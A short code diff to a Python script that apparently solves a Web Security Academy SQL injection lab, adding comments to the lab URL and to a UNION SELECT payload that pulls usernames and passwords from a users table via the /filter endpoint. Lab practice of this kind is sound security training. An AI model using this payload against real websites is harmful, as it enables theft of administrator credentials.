@@ -3,13 +3,13 @@ import requests
 from bs4 import BeautifulSoup
 import re
 
-BASE_URL = "https://0a7d001804d2f21889448760000300c9.web-security-academy.net"
+BASE_URL = "https://0a7d001804d2f21889448760000300c9.web-security-academy.net"  # Change
 
 session = requests.Session()
 
 print("[+] Extracting administrator credentials...")
 
-payload = "' UNION SELECT username, password FROM users--"
+payload = "' UNION SELECT username, password FROM users--"  # See the payloads in the lab-notes
 
 response = session.get(
     BASE_URL + "/filter",
